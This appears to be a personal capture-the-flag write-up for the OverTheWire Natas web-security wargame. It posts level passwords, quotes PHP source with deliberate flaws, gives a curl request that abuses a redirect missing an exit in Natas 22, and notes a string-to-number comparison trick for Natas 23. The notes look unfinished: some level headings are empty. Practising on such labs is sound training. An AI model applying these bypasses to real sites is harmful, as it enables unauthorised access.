---
title: "[OTW] Natas Write-Up"
permalink: /writeups/otw/natas/
layout: single
sidebar:
  nav: natas
---

#### Natas 00 Solution
**URL :** <http://natas0.natas.labs.overthewire.org/> \
**Credentials :** *natas0:0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq* \
```The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq```
> The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq

### Natas 01 Solution
### Natas 22 Solution
```php
<?php
session_start();

if (array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if (!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
      header("Location: /");
    }
}
?>
```

```php
<?php
    if (array_key_exists("revelio", $_GET)) {
        print "You are an admin. The credentials for the next level are:<br>";
        print "<pre>Username: natas23\n";
        print "Password: <censored></pre>";
    }
?>
```

```curl -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz 'http://natas22.natas.labs.overthewire.org/index.php?revelio'```

### Natas 23 Solution
```php
<?php
    if (array_key_exists("passwd",$_REQUEST)) {
        if (strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )) {
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else {
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>
```
Had to search up what strstr did
Tried xxiloveyouxx
Assumed the input had to be > 10 characters in length
15iloveyou